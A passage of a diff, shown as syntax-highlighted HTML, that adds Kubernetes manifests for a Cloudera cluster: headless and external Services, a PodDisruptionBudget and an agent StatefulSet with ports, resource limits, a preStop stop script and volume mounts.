+&lt;span class=&quot;na&quot;&gt;metadata&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+  &lt;span class=&quot;na&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;master-svc&lt;/span&gt;
+  &lt;span class=&quot;na&quot;&gt;namespace&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;cloudera&lt;/span&gt;
+  &lt;span class=&quot;na&quot;&gt;labels&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;na&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;master-svc&lt;/span&gt;
+    &lt;span class=&quot;na&quot;&gt;app&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;cloudera&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;spec&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;na&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;ClusterIP&lt;/span&gt;
+    &lt;span class=&quot;na&quot;&gt;clusterIP&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;None&lt;/span&gt;
+    &lt;span class=&quot;na&quot;&gt;ports&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;agent&lt;/span&gt;
+      &lt;span class=&quot;na&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;9000&lt;/span&gt;
+      &lt;span class=&quot;na&quot;&gt;protocol&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;TCP&lt;/span&gt;
+      &lt;span class=&quot;na&quot;&gt;targetPort&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;9000&lt;/span&gt;
+    &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;server&lt;/span&gt;
+      &lt;span class=&quot;na&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;7182&lt;/span&gt;
+      &lt;span class=&quot;na&quot;&gt;protocol&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;TCP&lt;/span&gt;
+      &lt;span class=&quot;na&quot;&gt;targetPort&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;7182&lt;/span&gt;
+    &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;parcel&lt;/span&gt;
+      &lt;span class=&quot;na&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;7191&lt;/span&gt;
+      &lt;span class=&quot;na&quot;&gt;protocol&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;TCP&lt;/span&gt;
+      &lt;span class=&quot;na&quot;&gt;targetPort&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;7191&lt;/span&gt;
+    &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;parcel-ssl&lt;/span&gt;
+      &lt;span class=&quot;na&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;4434&lt;/span&gt;
+      &lt;span class=&quot;na&quot;&gt;protocol&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;TCP&lt;/span&gt;
+      &lt;span class=&quot;na&quot;&gt;targetPort&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;4434&lt;/span&gt;
+    &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;ui&lt;/span&gt;
+      &lt;span class=&quot;na&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;7180&lt;/span&gt;
+      &lt;span class=&quot;na&quot;&gt;protocol&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;TCP&lt;/span&gt;
+      &lt;span class=&quot;na&quot;&gt;targetPort&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;7180&lt;/span&gt;
+    &lt;span class=&quot;na&quot;&gt;selector&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+        &lt;span class=&quot;na&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;master&lt;/span&gt;
+        &lt;span class=&quot;na&quot;&gt;app&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;cloudera&lt;/span&gt;
+&lt;span class=&quot;nn&quot;&gt;---&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;apiVersion&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;v1&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;kind&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;Service&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;metadata&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+  &lt;span class=&quot;na&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;master-external&lt;/span&gt;
+  &lt;span class=&quot;na&quot;&gt;namespace&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;cloudera&lt;/span&gt;
+  &lt;span class=&quot;na&quot;&gt;labels&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;na&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;master-external&lt;/span&gt;
+    &lt;span class=&quot;na&quot;&gt;app&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;cloudera&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;spec&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;na&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;ClusterIP&lt;/span&gt;
+    &lt;span class=&quot;na&quot;&gt;ports&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;ui&lt;/span&gt;
+      &lt;span class=&quot;na&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;7180&lt;/span&gt;
+      &lt;span class=&quot;na&quot;&gt;protocol&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;TCP&lt;/span&gt;
+      &lt;span class=&quot;na&quot;&gt;targetPort&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;7180&lt;/span&gt;
+    &lt;span class=&quot;na&quot;&gt;selector&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+        &lt;span class=&quot;na&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;master&lt;/span&gt;
+        &lt;span class=&quot;na&quot;&gt;app&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;cloudera&lt;/span&gt;
+&lt;span class=&quot;nn&quot;&gt;---&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;apiVersion&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;policy/v1beta1&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;kind&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;PodDisruptionBudget&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;metadata&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+  &lt;span class=&quot;na&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;agent-pdb&lt;/span&gt;
+  &lt;span class=&quot;na&quot;&gt;namespace&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;cloudera&lt;/span&gt;
+  &lt;span class=&quot;na&quot;&gt;labels&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;na&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;agent-pdb&lt;/span&gt;
+    &lt;span class=&quot;na&quot;&gt;app&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;cloudera&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;spec&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+  &lt;span class=&quot;na&quot;&gt;selector&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;na&quot;&gt;matchLabels&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+      &lt;span class=&quot;na&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;agent&lt;/span&gt;
+      &lt;span class=&quot;na&quot;&gt;app&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;cloudera&lt;/span&gt;
+  &lt;span class=&quot;na&quot;&gt;maxUnavailable&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;1&lt;/span&gt;
+&lt;span class=&quot;nn&quot;&gt;---&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;apiVersion&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;v1&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;kind&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;Service&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;metadata&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+  &lt;span class=&quot;na&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;agent-svc&lt;/span&gt;
+  &lt;span class=&quot;na&quot;&gt;namespace&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;cloudera&lt;/span&gt;
+  &lt;span class=&quot;na&quot;&gt;labels&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;na&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;agent-svc&lt;/span&gt;
+    &lt;span class=&quot;na&quot;&gt;app&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;cloudera&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;spec&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;na&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;ClusterIP&lt;/span&gt;
+    &lt;span class=&quot;na&quot;&gt;clusterIP&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;None&lt;/span&gt;
+    &lt;span class=&quot;na&quot;&gt;ports&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;agent&lt;/span&gt;
+      &lt;span class=&quot;na&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;9000&lt;/span&gt;
+      &lt;span class=&quot;na&quot;&gt;protocol&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;TCP&lt;/span&gt;
+      &lt;span class=&quot;na&quot;&gt;targetPort&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;9000&lt;/span&gt;
+    &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;server&lt;/span&gt;
+      &lt;span class=&quot;na&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;7182&lt;/span&gt;
+      &lt;span class=&quot;na&quot;&gt;protocol&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;TCP&lt;/span&gt;
+      &lt;span class=&quot;na&quot;&gt;targetPort&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;7182&lt;/span&gt;
+    &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;parcel&lt;/span&gt;
+      &lt;span class=&quot;na&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;7191&lt;/span&gt;
+      &lt;span class=&quot;na&quot;&gt;protocol&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;TCP&lt;/span&gt;
+      &lt;span class=&quot;na&quot;&gt;targetPort&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;7191&lt;/span&gt;
+    &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;parcel-ssl&lt;/span&gt;
+      &lt;span class=&quot;na&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;4434&lt;/span&gt;
+      &lt;span class=&quot;na&quot;&gt;protocol&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;TCP&lt;/span&gt;
+      &lt;span class=&quot;na&quot;&gt;targetPort&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;4434&lt;/span&gt;
+    &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;parcel-ssl2&lt;/span&gt;
+      &lt;span class=&quot;na&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;4433&lt;/span&gt;
+      &lt;span class=&quot;na&quot;&gt;protocol&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;TCP&lt;/span&gt;
+      &lt;span class=&quot;na&quot;&gt;targetPort&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;4433&lt;/span&gt;
+    &lt;span class=&quot;na&quot;&gt;selector&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+        &lt;span class=&quot;na&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;agent&lt;/span&gt;
+        &lt;span class=&quot;na&quot;&gt;app&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;cloudera&lt;/span&gt;
+&lt;span class=&quot;nn&quot;&gt;---&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;apiVersion&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;apps/v1&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;kind&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;StatefulSet&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;metadata&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+  &lt;span class=&quot;na&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;agent&lt;/span&gt;
+  &lt;span class=&quot;na&quot;&gt;namespace&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;cloudera&lt;/span&gt;
+  &lt;span class=&quot;na&quot;&gt;labels&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;na&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;agent-sts&lt;/span&gt;
+    &lt;span class=&quot;na&quot;&gt;app&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;cloudera&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;spec&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+  &lt;span class=&quot;na&quot;&gt;selector&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;na&quot;&gt;matchLabels&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+      &lt;span class=&quot;na&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;agent&lt;/span&gt;
+      &lt;span class=&quot;na&quot;&gt;app&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;cloudera&lt;/span&gt;
+  &lt;span class=&quot;na&quot;&gt;serviceName&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;agent-svc&lt;/span&gt;
+  &lt;span class=&quot;na&quot;&gt;updateStrategy&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;na&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;RollingUpdate&lt;/span&gt;
+  &lt;span class=&quot;na&quot;&gt;podManagementPolicy&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;OrderedReady&lt;/span&gt;
+  &lt;span class=&quot;na&quot;&gt;replicas&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;3&lt;/span&gt;
+  &lt;span class=&quot;na&quot;&gt;revisionHistoryLimit&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;2&lt;/span&gt;
+  &lt;span class=&quot;na&quot;&gt;template&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;na&quot;&gt;metadata&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+      &lt;span class=&quot;na&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;cagent&lt;/span&gt;
+      &lt;span class=&quot;na&quot;&gt;namespace&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;cloudera&lt;/span&gt;
+      &lt;span class=&quot;na&quot;&gt;labels&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+        &lt;span class=&quot;na&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;agent&lt;/span&gt;
+        &lt;span class=&quot;na&quot;&gt;app&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;cloudera&lt;/span&gt;
+    &lt;span class=&quot;na&quot;&gt;spec&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+      &lt;span class=&quot;na&quot;&gt;tolerations&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;effect&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;NoSchedule&lt;/span&gt;
+        &lt;span class=&quot;na&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;node-role.kubernetes.io/master&lt;/span&gt;
+      &lt;span class=&quot;na&quot;&gt;restartPolicy&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;Always&lt;/span&gt;
+      &lt;span class=&quot;na&quot;&gt;serviceAccountName&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;cloudera-sa&lt;/span&gt;
+      &lt;span class=&quot;na&quot;&gt;automountServiceAccountToken&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;true&lt;/span&gt;
+      &lt;span class=&quot;na&quot;&gt;containers&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;agent&lt;/span&gt;
+        &lt;span class=&quot;na&quot;&gt;image&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;registry-vpc.cn-hangzhou.aliyuncs.com/huaching_prod/cloudera-node:5.14.2&lt;/span&gt;
+&lt;span class=&quot;c1&quot;&gt;#        imagePullPolicy: IfNotPresent&lt;/span&gt;
+        &lt;span class=&quot;na&quot;&gt;resources&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+          &lt;span class=&quot;na&quot;&gt;limits&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+            &lt;span class=&quot;na&quot;&gt;memory&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;4096Mi&quot;&lt;/span&gt;
+            &lt;span class=&quot;na&quot;&gt;cpu&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;1000m&quot;&lt;/span&gt;
+        &lt;span class=&quot;na&quot;&gt;lifecycle&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+          &lt;span class=&quot;na&quot;&gt;preStop&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+            &lt;span class=&quot;na&quot;&gt;exec&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+              &lt;span class=&quot;na&quot;&gt;command&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;pi&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;/bin/bash&quot;&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;-c&quot;&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;/cloudera-init/run/stop.sh&quot;&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;]&lt;/span&gt;
+        &lt;span class=&quot;na&quot;&gt;volumeMounts&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+        &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;repo&lt;/span&gt;
+          &lt;span class=&quot;na&quot;&gt;mountPath&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;/opt/cloudera/parcel-repo/&lt;/span&gt;
+        &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;lib&lt;/span&gt;
+          &lt;span class=&quot;na&quot;&gt;mountPath&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;/opt/cm/lib/cloudera-scm-agent/&lt;/span&gt;
